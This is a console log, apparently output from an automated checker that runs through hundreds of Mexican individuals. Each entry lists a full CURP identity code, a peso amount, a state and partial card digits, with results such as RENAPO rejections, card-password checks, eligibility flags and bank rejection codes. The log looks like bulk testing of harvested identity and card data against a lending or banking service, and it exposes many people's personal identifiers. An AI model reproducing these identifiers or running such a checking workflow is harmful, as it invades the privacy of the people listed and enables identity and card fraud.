[2528] ID:4579067 | CIVJ710404MDFHLN05 | $174,000 | CIUDAD DE ME | T:3135... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.0s)
[2529] ID:4612510 | VAGX730405HTCZMS09 | $174,000 | TABASCO | T:1975... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2538 para ID:4273889 ($174,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[2530] ID:4655068 | AAIJ700310MSOLBN09 | $174,000 | SONORA | T:0333... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2531] ID:4777340 | CIBJ750926HDFRRN03 | $174,000 | CIUDAD DE ME | T:3668... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[2532] ID:4778621 | ROMM700718HDFMJR05 | $174,000 | CIUDAD DE ME | T:7629... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3135 para ID:4579067 ($174,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2533] ID:4881483 | CUPJ701121HDFNRN03 | $174,000 | CIUDAD DE ME | T:4489... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[2534] ID:3680751 | BEGJ730307HTSTTN01 | $173,980 | TAMAULIPAS | T:9827... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3668 para ID:4777340 ($174,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[2535] ID:3411085 | MALC770601MJCCNR07 | $173,940 | JALISCO | T:9492... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.5s)
[2536] ID:686154 | VABX691101MBCLTN06 | $173,920 | BAJA CALIFOR | T:5291... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2537] ID:3686500 | HEMD770320HCSRRN02 | $173,920 | CHIAPAS | T:6086... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4489 para ID:4881483 ($174,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.2s)
[2538] ID:3924845 | MAGL690615HHGNRR09 | $173,920 | HIDALGO | T:7529... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.5s)
[2539] ID:2429348 | CEJE780524MGTDRS07 | $173,910 | GUANAJUATO | T:0797... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6086 para ID:3686500 ($173,920)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[2540] ID:3800174 | DERE700107MGRLML06 | $173,910 | GUERRERO | T:5669... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.6s)
[2541] ID:1086767 | WENR710402HNLBRL04 | $173,900 | NUEVO LEON | T:8319... [🔴 OFF] Contacto preexistente (/confirm-contact) (21.0s)
[2542] ID:191078 | GANC750830HMSLVS09 | $173,880 | MORELOS | T:6267... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2543] ID:395617 | MOAN740714MMCCRN08 | $173,850 | ESTADO DE ME | T:7281... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2544] ID:2495996 | VEZA720730MJCGMN01 | $173,850 | JALISCO | T:4740... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[2545] ID:71664 | GAGS690130MVRRRS02 | $173,820 | VERACRUZ | T:6442... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2546] ID:3967832 | MASH701122HMCRLC04 | $173,800 | ESTADO DE ME | T:1662... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.0s)
[2547] ID:2192386 | CARD700914MASSYN04 | $173,770 | AGUASCALIENT | T:0332... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2548] ID:1430479 | GOAJ750716HVRNRN04 | $173,750 | VERACRUZ | T:5972... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2549] ID:1387738 | CORE720218MMCRSL02 | $173,720 | ESTADO DE ME | T:3398... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[2550] ID:2928242 | LASC690512MDFRLL00 | $173,720 | CIUDAD DE ME | T:3256... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2551] ID:780634 | FOMV700830HMNNLC04 | $173,700 | MICHOACAN | T:4400... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[2552] ID:2730044 | SAOJ690530HJCNLN08 | $173,650 | JALISCO | T:8727... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3256 para ID:2928242 ($173,720)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[2553] ID:3075031 | ROCF740115HDFSNR00 | $173,620 | CIUDAD DE ME | T:2134... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[2554] ID:1234754 | AURG000101HCLHSRA4 | $173,600 | COAHUILA | T:6157... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[2555] ID:2608390 | GARD720616MNLYDL02 | $173,600 | NUEVO LEON | T:3127... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4400 para ID:780634 ($173,700)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (19.2s)
[2556] ID:4331050 | CUVL690429MDGRCR09 | $173,600 | DURANGO | T:7618... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.9s)
[2557] ID:4455561 | GUBJ780930HMCRSL02 | $173,600 | ESTADO DE ME | T:8523... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2558] ID:1469454 | LOME710118HOCPRL03 | $173,540 | OAXACA | T:0399... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.5s)
[2559] ID:3174611 | GUSM720509HDFRNR08 | $173,520 | CIUDAD DE ME | T:8779... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.9s)
[2560] ID:3215033 | MACG750131HVRRNL06 | $173,510 | VERACRUZ | T:2306... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[2561] ID:1548707 | AOGC711019HQRCTR08 | $173,500 | QUINTANA ROO | T:4751... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2562] ID:4723610 | OACA740508HQRRBL01 | $173,470 | QUINTANA ROO | T:9485... [🔴 OFF] Contacto preexistente (/confirm-contact) (20.6s)
[2563] ID:2542344 | ROVL740405MDFGCR06 | $173,460 | CIUDAD DE ME | T:2015... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.7s)
[2564] ID:3646214 | MEAL701025HNLNCS03 | $173,460 | NUEVO LEON | T:5300... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2565] ID:3266035 | GARA750219HNLRSD00 | $173,440 | NUEVO LEON | T:6929... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2566] ID:4251343 | TATM701007MPLMSR03 | $173,440 | PUEBLA | T:3279... [🔴 OFF] Rechazo bancario (PE170) (17.0s)
[2567] ID:4635245 | RAGJ711005HNLMRN03 | $173,430 | NUEVO LEON | T:0528... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.6s)
[2568] ID:4829617 | CAMM790808MSPLYR03 | $173,430 | SAN LUIS POT | T:2508... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3279 para ID:4251343 ($173,440)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[2569] ID:3381613 | RECS721010HDFYHR01 | $173,420 | CIUDAD DE ME | T:2656... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.9s)
[2570] ID:4663194 | RECS721010HDFYHR01 | $173,420 | CIUDAD DE ME | T:7742... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.9s)
[2571] ID:4888672 | CAOS740424HYCTRR00 | $173,420 | YUCATAN | T:7513... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.9s)
[2572] ID:886275 | PERJ760710HJCNDS03 | $173,410 | JALISCO | T:7158... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2573] ID:2578706 | MOGV691011MMCRNR03 | $173,400 | ESTADO DE ME | T:7592... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2574] ID:4565702 | MACE740613HCHRZL00 | $173,400 | CHIHUAHUA | T:1652... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[2575] ID:3261419 | CESA720324HCGNLN05 | $173,390 | COAHUILA | T:2308... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[2576] ID:1200043 | COCP720927HDFRRB09 | $173,360 | CIUDAD DE ME | T:0912... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[2577] ID:1922678 | FOMV700830HMNNLC04 | $173,350 | MICHOACAN | T:5314... [🔴 OFF] Rechazo bancario (PE040) (15.5s)
[2578] ID:295416 | ROMR690205HSPDDL06 | $173,340 | SAN LUIS POT | T:2808... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[2579] ID:1301404 | GOBT690528MJCRRR06 | $173,340 | JALISCO | T:2931... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5314 para ID:1922678 ($173,350)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2580] ID:2838823 | EOSS710907HNLSRR07 | $173,330 | NUEVO LEON | T:5197... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2581] ID:2644564 | HUPL731016MDFRNR00 | $173,320 | CIUDAD DE ME | T:9854... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.1s)
[2582] ID:1504998 | PELO700813HTLRZM08 | $173,310 | TLAXCALA | T:1311... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5197 para ID:2838823 ($173,330)... [🔴 OFF] Rechazo bancario (PE1002) (12.7s)
[2583] ID:2957508 | MEAX691106HMNNCC01 | $173,310 | MICHOACAN | T:7626... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[2584] ID:1808052 | TAMJ720315HCGFRR04 | $173,300 | COAHUILA | T:0057... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[2585] ID:2014962 | VAHC731114HCMLRR03 | $173,250 | COLIMA | T:6879... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1311 para ID:1504998 ($173,310)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2586] ID:2233137 | MEMR690425HJCNNL03 | $173,250 | JALISCO | T:4561... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2587] ID:3757583 | AUPA750702HCHRRR01 | $173,250 | CHIHUAHUA | T:3427... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[2588] ID:4001585 | ROHS751113HSOCRR06 | $173,250 | SONORA | T:0622... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3427 para ID:3757583 ($173,250)... [🔴 OFF] Rechazo bancario (PE170) (14.7s)
[2589] ID:665575 | CEVB700126MDFDLR06 | $173,210 | CIUDAD DE ME | T:0227... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2590] ID:2803903 | DIAN781110MJCZGR01 | $173,200 | JALISCO | T:7796... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.6s)
[2591] ID:1505245 | JIHP750330HDFMRD06 | $173,190 | CIUDAD DE ME | T:4610... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0227 para ID:665575 ($173,210)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.8s)
[2592] ID:2418725 | GOJJ721004HDFNCN07 | $173,170 | CIUDAD DE ME | T:9243... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2593] ID:74606 | ZALJ720713HDFMNL01 | $173,160 | CIUDAD DE ME | T:3106... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.3s)
[2594] ID:1387189 | MOCG720407HNLNVN01 | $173,150 | NUEVO LEON | T:3233... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4610 para ID:1505245 ($173,190)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[2595] ID:3711927 | RAOC700107HJCMCR01 | $173,140 | JALISCO | T:2386... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[2596] ID:4218153 | RECA730723HCMYRL03 | $173,133 | COLIMA | T:2744... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3106 para ID:74606 ($173,160)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[2597] ID:606349 | JIBA710808HTCMSL08 | $173,080 | TABASCO | T:9882... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE110) (13.9s)
[2598] ID:2291659 | YARC701229HSOMBR02 | $173,080 | SINALOA | T:3554... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3233 para ID:1387189 ($173,150)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[2599] ID:4122490 | CARJ700124HDGHYR04 | $173,080 | DURANGO | T:1426... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2600] ID:971781 | GARA750219HNLRSD00 | $173,020 | NUEVO LEON | T:3457... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2744 para ID:4218153 ($173,133)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (20.6s)
[2601] ID:179927 | OINM710414HTSLRR04 | $173,000 | TAMAULIPAS | T:6526... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2602] ID:478271 | HEFR741024HDGRRF08 | $173,000 | DURANGO | T:3981... [🔴 OFF] Rechazo bancario (PE170) (14.2s)
[2603] ID:483265 | RILR711021HMCVML09 | $173,000 | ESTADO DE ME | T:1086... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9882 para ID:606349 ($173,080)... [🔴 OFF] Rechazo bancario (PE170) (13.1s)
[2604] ID:498902 | MOAR711231MMCRVS08 | $173,000 | ESTADO DE ME | T:8596... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2605] ID:602892 | GUHR750322HGTZFC05 | $173,000 | GUANAJUATO | T:8547... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2606] ID:631400 | SITJ771118HBCLPL06 | $173,000 | BAJA CALIFOR | T:5724... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[2607] ID:732267 | GAOJ720131HJCRLN09 | $173,000 | JALISCO | T:8099... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8596 para ID:498902 ($173,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2608] ID:786897 | IUVA701011HDFTLL04 | $173,000 | CIUDAD DE ME | T:1476... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (12.7s)
[2609] ID:912919 | PEPN731213MQTRRR04 | $173,000 | QUERETARO | T:7715... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[2610] ID:1013703 | CAFP711217HVRRNB03 | $173,000 | VERACRUZ | T:4542... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[2611] ID:1018146 | SIHS781019HJCLRL09 | $173,000 | JALISCO | T:8658... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7715 para ID:912919 ($173,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2612] ID:1026971 | LAAA730724HPLYRL08 | $173,000 | PUEBLA | T:5373... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.0s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[2613] ID:1087634 | HERM701004MTSRBR04 | $173,000 | TAMAULIPAS | T:5239... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8658 para ID:1018146 ($173,000)... [🔴 OFF] Rechazo bancario (PE1002) (12.1s)
[2614] ID:1219516 | MAMS700823MSORRN04 | $173,000 | SINALOA | T:7897... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2615] ID:1350265 | MOMJ700827HGTRRR09 | $173,000 | GUANAJUATO | T:0224... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[2616] ID:1403782 | NIGL770907MGRCRR06 | $173,000 | GUERRERO | T:8772... [🔴 OFF] Rechazo bancario (PE110) (17.4s)
[2617] ID:1596516 | CAGF741005MDFSNL09 | $173,000 | CIUDAD DE ME | T:5461... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[2618] ID:1670626 | AESO690915HTSSLS02 | $173,000 | TAMAULIPAS | T:9683... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.7s)
[2619] ID:1981981 | MACO710829HCHRDS06 | $173,000 | CHIHUAHUA | T:9160... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5461 para ID:1596516 ($173,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.9s)
[2620] ID:2013530 | TEPS690314HJCJRR09 | $173,000 | JALISCO | T:1212... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (13.3s)
[2621] ID:2052193 | ROHP760316MGTMRL03 | $173,000 | GUANAJUATO | T:3834... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.4s)
[2622] ID:2058878 | GAGU711113HDFRRS04 | $173,000 | CIUDAD DE ME | T:8757... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1212 para ID:2013530 ($173,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2623] ID:2207642 | SOTG720826HCHTRB00 | $173,000 | CHIHUAHUA | T:3593... [🔴 OFF] Rechazo bancario (PE170) (13.8s)
[2624] ID:2210335 | AASR700623MGTLGQ07 | $173,000 | GUANAJUATO | T:2584... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2625] ID:2369974 | MAMS700823MSORRN04 | $173,000 | SINALOA | T:1624... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2626] ID:2400067 | OOCL751203HSOCRS06 | $173,000 | SINALOA | T:2955... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[2627] ID:2429196 | MOTJ731016HSONRN06 | $173,000 | SINALOA | T:3735... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2628] ID:2487380 | SIHS781019HJCLRL09 | $173,000 | JALISCO | T:9448... [⚠️ RETRY] Excepción red: Failed to perform, curl: (28) Operation timed out after 6015 (12.3s)
[2629] ID:2511561 | VACC690703MCHRSL06 | $173,000 | CHIHUAHUA | T:2664... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.3s)
[2630] ID:2635252 | GAGJ700530HSORTS02 | $173,000 | SONORA | T:8845... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9448 para ID:2487380 ($173,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.1s)
[2631] ID:2709981 | AULS730301MPLRPL02 | $173,000 | PUEBLA | T:6932... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (19.8s)
[2632] ID:2786821 | MAPI800410MPLRRN07 | $173,000 | PUEBLA | T:7857... [🔴 OFF] Rechazo bancario (PE1002) (11.3s)
[2633] ID:3245240 | CEJF760907HDFRMR00 | $173,000 | CIUDAD DE ME | T:4866... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[2634] ID:3426313 | MONK741114MDFRVT07 | $173,000 | CIUDAD DE ME | T:7776... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7857 para ID:2786821 ($173,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[2635] ID:3433378 | VILO730111HVRLZM07 | $173,000 | VERACRUZ | T:7339... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[2636] ID:3666788 | VAVR701210HNLLLB05 | $173,000 | NUEVO LEON | T:6428... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2637] ID:3889730 | BALM690405HCGRZR02 | $173,000 | COAHUILA | T:5651... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2638] ID:3924251 | LERS800121HVRVML00 | $173,000 | VERACRUZ | T:5819... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2639] ID:4158681 | BAUH760731HSOZRC02 | $173,000 | SINALOA | T:9271... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[2640] ID:4401010 | MACN690606HMCRHR02 | $173,000 | ESTADO DE ME | T:0091... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2641] ID:4733253 | CAAA700915MSORRR07 | $173,000 | SINALOA | T:4519... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2642] ID:2235844 | QURA741022HCHZMR05 | $172,980 | CHIHUAHUA | T:9506... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2643] ID:741717 | FOCJ710810HBSLRN06 | $172,970 | BAJA CALIFOR | T:7265... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2644] ID:666831 | PEGF750718HNLRNR02 | $172,940 | NUEVO LEON | T:8960... [🔴 OFF] Rechazo bancario (PE160) (9.4s)
[2645] ID:3372469 | CAGV800722HNLSML02 | $172,930 | NUEVO LEON | T:8647... [🔴 OFF] Rechazo bancario (PE1002) (11.5s)
[2646] ID:2418641 | CAVM770220HDFNLR01 | $172,920 | CIUDAD DE ME | T:7476... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[2647] ID:1252135 | PALH740402HTSRRC01 | $172,900 | TAMAULIPAS | T:8273... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.6s)
[2648] ID:820460 | RURC720805MZSZML01 | $172,890 | ZACATECAS | T:4287... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7476 para ID:2418641 ($172,920)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2649] ID:3008390 | DIPB731012MJCZNR05 | $172,890 | JALISCO | T:0457... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[2650] ID:3527436 | COMD740916HDFRZN09 | $172,880 | CIUDAD DE ME | T:0643... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.5s)
[2651] ID:1912479 | MOVF690725HGTRZC01 | $172,840 | GUANAJUATO | T:8027... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0457 para ID:3008390 ($172,890)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.4s)
[2652] ID:13970 | MOMA750531HMCLGN00 | $172,800 | ESTADO DE ME | T:0400... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.6s)
[2653] ID:352363 | PURY790817MJCLMG04 | $172,800 | TONALA | T:8940... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[2654] ID:1000269 | LOAO700216MJCPGF08 | $172,800 | JALISCO | T:9621... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0643 para ID:3527436 ($172,880)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.4s)
[2655] ID:2239195 | GOSE690626HJCMNL06 | $172,800 | JALISCO | T:4898... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8940 para ID:352363 ($172,800)... [🔴 OFF] Rechazo bancario (PE170) (15.8s)
[2656] ID:2790970 | NACM700903HCHVLR00 | $172,800 | CHIHUAHUA | T:1098... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.4s)
[2657] ID:3260764 | AACR720709HDFLRD03 | $172,800 | CIUDAD DE ME | T:1727... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4898 para ID:2239195 ($172,800)... [🔴 OFF] Rechazo bancario (PE170) (15.2s)
[2658] ID:3792241 | GORA710804HJCMYL00 | $172,800 | JALISCO | T:7945... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2659] ID:4127949 | MAAN690102HJCCLR00 | $172,800 | JALISCO | T:3590... [2660] ID:3866195 | SAMS700122HZSNRL02 | $172,780 | ZACATECAS | T:4403... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1727 para ID:3260764 ($172,800)... [🔴 OFF] Rechazo bancario (PE170) (12.9s)
[2661] ID:3186304 | GOCR710902HNLVDG04 | $172,770 | NUEVO LEON | T:7651... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[2662] ID:2955487 | GARA690304HDFRNG07 | $172,740 | CIUDAD DE ME | T:3606... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[2663] ID:4516067 | MOAC700109HMSNLR02 | $172,720 | MORELOS | T:8621... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2664] ID:2163206 | FOFB690729MBSLLT05 | $172,700 | BAJA CALIFOR | T:4467... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[2665] ID:4648242 | GOSM750306HJCNRG07 | $172,698 | JALISCO | T:5349... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.3s)
[2666] ID:2795901 | MUVC700913MMCNLL07 | $172,690 | ESTADO DE ME | T:4578... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4467 para ID:2163206 ($172,700)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.8s)
[2667] ID:737227 | AUBJ780124HDFGRR00 | $172,660 | CIUDAD DE ME | T:5345... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5349 para ID:4648242 ($172,698)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.6s)
[2668] ID:3192510 | FOLR691001HJCLPL04 | $172,620 | JALISCO | T:3770... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.8s)
